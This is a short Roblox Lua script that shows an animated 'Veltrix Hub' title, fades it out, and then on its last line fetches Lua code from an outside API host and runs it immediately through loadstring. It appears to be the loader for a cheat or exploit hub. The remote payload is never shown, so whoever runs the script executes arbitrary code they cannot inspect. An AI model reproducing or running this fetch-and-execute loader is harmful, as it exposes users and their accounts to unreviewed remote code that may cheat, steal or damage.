local INTRO_TEXT = "𝚅𝚎𝚕𝚝𝚛𝚒𝚡 𝙷𝚞𝚋"
local SHOW_TIME = 2      
local TYPE_SPEED = 0.05 
local FADE_TIME = 0.8   

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "IntroGui"
gui.Parent = player:WaitForChild("PlayerGui")

local text = Instance.new("TextLabel")
text.Parent = gui
text.Size = UDim2.new(1, 0, 0.2, 0)
text.Position = UDim2.new(0, 0, 0.4, 0)
text.BackgroundTransparency = 1 
text.Text = ""
text.TextScaled = true
text.Font = Enum.Font.GothamBold
text.TextColor3 = Color3.fromRGB(255, 255, 255)
text.TextTransparency = 0

for i = 1, #INTRO_TEXT do
	text.Text = string.sub(INTRO_TEXT, 1, i)
	task.wait(TYPE_SPEED)
end

task.wait(SHOW_TIME)

local fadeTween = TweenService:Create(
	text,
	TweenInfo.new(FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
	{ TextTransparency = 1 }
)
fadeTween:Play()
fadeTween.Completed:Wait()

gui:Destroy()


loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/5c416c28167ec6ee9051edf5c83bd362bf5a7c4d1b3e63fe37fd4a1620a06ede/download"))()
